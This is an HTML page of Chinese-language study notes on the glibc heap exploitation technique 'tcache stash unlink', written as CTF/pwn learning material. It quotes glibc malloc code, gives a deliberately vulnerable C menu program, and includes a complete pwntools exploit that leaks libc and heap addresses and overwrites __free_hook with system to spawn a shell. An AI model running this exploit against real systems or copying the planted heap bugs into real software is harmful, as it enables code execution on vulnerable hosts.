<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title># tcache stash unlink,tcache stash unlink</title>
    <link rel="stylesheet" href="../../../../assets/css/notes.min.css">
</head>
<body>
    <div id="header-placeholder"></div>
    <div class="main-content-wrapper">
        <main class="content">
            <h1>tcache stash unlink</h1>
<h2>1.基本原理</h2>
<p>适用条件：要同时有 malloc 和 calloc，同时该方法也是house of pig的一个前置利用手法</p>
<p>从 small bin 中取出 chunk 时会对该 chunk 的 bk 指向的 chunk 的 fd 进行检查：</p>
<pre><code class="language-c">if (in_smallbin_range (nb))
{
  idx = smallbin_index (nb);
  bin = bin_at (av, idx);

  if ((victim = last (bin)) != bin)
    {
      bck = victim-&gt;bk;
  if (__glibc_unlikely (bck-&gt;fd != victim))
    malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);
      set_inuse_bit_at_offset (victim, nb);
      bin-&gt;bk = bck;
      bck-&gt;fd = bin;
</code></pre>
<p>但是最后将 small bin 中剩余 chunk 放入 tcache 直到 tcache 填满的过程却不会进行检查：</p>
<pre><code class="language-c">#if USE_TCACHE
      /* While we're here, if we see other chunks of the same size,
     stash them in the tcache.  */
      size_t tc_idx = csize2tidx (nb);
      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
    {
      mchunkptr tc_victim;

      /* While bin not empty and tcache not full, copy chunks.  */
      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
         &amp;&amp; (tc_victim = *fb) != NULL)
        {
          if (SINGLE_THREAD_P)
        *fb = tc_victim-&gt;fd;
          else
        {
          REMOVE_FB (fb, pp, tc_victim);
          if (__glibc_unlikely (tc_victim == NULL))
            break;
        }
          tcache_put (tc_victim, tc_idx);
        }
    }
#endif
</code></pre>
<p>那么我们就可以将smallbin的一个fd或bk指针指向我们要申请的内存，经过一个calloc之后，由于stash机制，smallbin中剩下的chunk会放入对应的tcache中将其填满，此时若fack chunk放入了tcache中，我们就可以将其申请出来，最终效果是任意地址 malloc 和任意地址写某个（些）值</p>
<p><img src="/0101/PWN/堆利用/BinAttack/assets/14.tcache_stash_unlink/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE.drawio.png" alt="未命名绘图.drawio"></p>
<h2>2.利用</h2>
<p>源码：（增加了一个calloc的选项）</p>
<pre><code>#include&lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

char* chunklist[100];

void menu() {
    puts(&quot;1. add chunk&quot;);
    puts(&quot;2. delete chunk&quot;);
    puts(&quot;3. edit chunk&quot;);
    puts(&quot;4. show chunk&quot;);
    puts(&quot;5. exit&quot;);
    puts(&quot;choice:&quot;);
}

int get_num(){
    char buf[0x10];
    read(0, buf, sizeof(buf));
    return atoi(buf);
}

void add_chunk(){
    puts(&quot;index:&quot;);
    int index = get_num();
    puts(&quot;size:&quot;);
    int size = get_num();
    puts(&quot;type:&quot;);
    int type = get_num();
    chunklist[index] = type == 1 ? calloc(1, size) : malloc(size);
}

void delete_chunk(){
    puts(&quot;index:&quot;);
    int index = get_num();
    free(chunklist[index]);
}

void edit_chunk(){
    puts(&quot;index:&quot;);
    int index = get_num();
    puts(&quot;length:&quot;);
    int length = get_num();
    puts(&quot;content:&quot;);
    read(0, chunklist[index], length);
}

void show_chunk(){
    puts(&quot;index:&quot;);
    int index = get_num();
    puts(chunklist[index]);
}

int main(){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    while (1) {
        menu();
        switch (get_num()) {
            case 1:
                add_chunk();
                break;
            case 2:
                delete_chunk();
                break;
            case 3:
                edit_chunk();
                break;
            case 4:
                show_chunk();
                break;
            case 5:
                exit(0);
            default:
                puts(&quot;invalid input&quot;);
        }

    }
}
</code></pre>
<p>exp：</p>
<pre><code class="language-python">from pwn import *
# patchelf --set-interpreter new_ld_address file_path
# patchelf --replace-needed old_libc.so.6 new_libc.so.6 file_path
# pycharm # ctrl+/

# local pwn
elf_path = './tcache_stash_ublink'
elf = ELF(elf_path)
# libc = ELF('/home/ubuntu/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context(arch=elf.arch, os=elf.os, log_level=&quot;debug&quot;)

p = process([elf_path])

#-----------------------------------------------------------------------------------------
it      = lambda                    :p.interactive()
sd      = lambda data               :p.send((data))
sa     	= lambda delim,data         :p.sendafter((delim), (data))
sl      = lambda data               :p.sendline((data))
sla     = lambda delim,data         :p.sendlineafter((delim), (data))
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=False :p.recvuntil(delims, drop)
rl      = lambda                    :p.recvline()
l       = lambda str1               :log.success(str1)
li      = lambda str1,data1         :log.success(str1+' ========&gt; '+hex(data1))
uu32    = lambda data               :u32(data.ljust(4, b&quot;\x00&quot;))
uu64    = lambda data               :u64(data.ljust(8, b&quot;\x00&quot;))
u32Leakbase = lambda offset         :u32(ru(b&quot;\xf7&quot;)[-4:]) - offset
u64Leakbase = lambda offset         :u64(ru(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - offset
#-----------------------------------------------------------------------------------------

def add_chunk(index, size, type=0):
    sla(b&quot;choice:\n&quot;, b&quot;1&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())
    sla(b&quot;size:\n&quot;, str(size).encode())
    sla(b&quot;type:\n&quot;, str(type).encode())


def delete_chunk(index):
    sla(b&quot;choice:\n&quot;, b&quot;2&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())

def edit_chunk(index, content):
    sla(b&quot;choice:\n&quot;, b&quot;3&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())
    sla(b&quot;length:\n&quot;, str(len(content)).encode())
    sa(b&quot;content:\n&quot;, content)

def show_chunk(index):
    sla(b&quot;choice:\n&quot;, b&quot;4&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())

def exit_p():
    sla(b&quot;choice:\n&quot;, b&quot;5&quot;)

# leak libc
add_chunk(0, 0x420)
add_chunk(1, 0x10)
add_chunk(2, 0x410)
add_chunk(3, 0x10)
delete_chunk(0)
show_chunk(0)
libc.address = u64Leakbase(0x1ecbe0)
li(&quot;libc addr:&quot;, libc.address)

# largebin attack2
add_chunk(20, 0x500)
edit_chunk(0, p64(0)*3 + p64(libc.sym['__free_hook']-0x18))
delete_chunk(2)
add_chunk(20, 0x500)
show_chunk(0)
heap_addr = u64(ru([b&quot;\x55&quot;, b&quot;\x56&quot;])[-6:].ljust(8, b&quot;\x00&quot;)) - 0x6e0
li(&quot;heap_addr:&quot;, heap_addr)

# fix largebin
edit_chunk(0, p64(heap_addr+0x6e0)+p64(libc.address+0x1ecfd0)+p64(heap_addr+0x6e0)+p64(heap_addr+0x6e0))
edit_chunk(2, p64(libc.address+0x1ecfd0)+p64(heap_addr+0x290)+p64(heap_addr+0x290)+p64(heap_addr+0x290))
add_chunk(0, 0x420)
add_chunk(0, 0x410)

# tcache stash unlink
for i in range(1, 8):
    add_chunk(i, 0x100)
add_chunk(8, 0x100)
add_chunk(20, 0x10)
add_chunk(9, 0x100)
add_chunk(20, 0x10)
for i in range(7, 0, -1):
    delete_chunk(i)
delete_chunk(9)
delete_chunk(8)
add_chunk(20, 0x200)

edit_chunk(8, p64(heap_addr+0x1de0)+p64(libc.sym['__free_hook']-0x10))
add_chunk(1, 0x100)
add_chunk(1, 0x100)
add_chunk(20, 0x100, 1)

# get chunk and get shell
add_chunk(0, 0x100)
edit_chunk(0, p64(libc.sym['system']))
edit_chunk(1, b'/bin/sh\x00')
delete_chunk(1)
it()
</code></pre>
<p>注意：</p>
<ul>
<li>fack1 chunk 的 <strong>bk 要指向可读写内存</strong>，否则 fack2 chunk 的 fd 无法指向 small bin，就会造成访存错误</li>
<li>手法利用之前，利用largebin attack2构造fakechunk，构造完成后需要手动计算并修复原本largebin中的堆块，以防对后面利用造成影响：</li>
</ul>
<p><img src="/0101/PWN/堆利用/BinAttack/assets/14.tcache_stash_unlink/image-20250303144423440.png" alt="image-20250303144423440"></p>

        </main>
    </div>
    <footer class="footer">
        <p>&copy; 2024 waiwai24. All rights reserved.</p>
    </footer>
    <script src="../../../../assets/js/header.js"></script>
    <script src="../../../../assets/js/include-header.js"></script>
</body>
</html>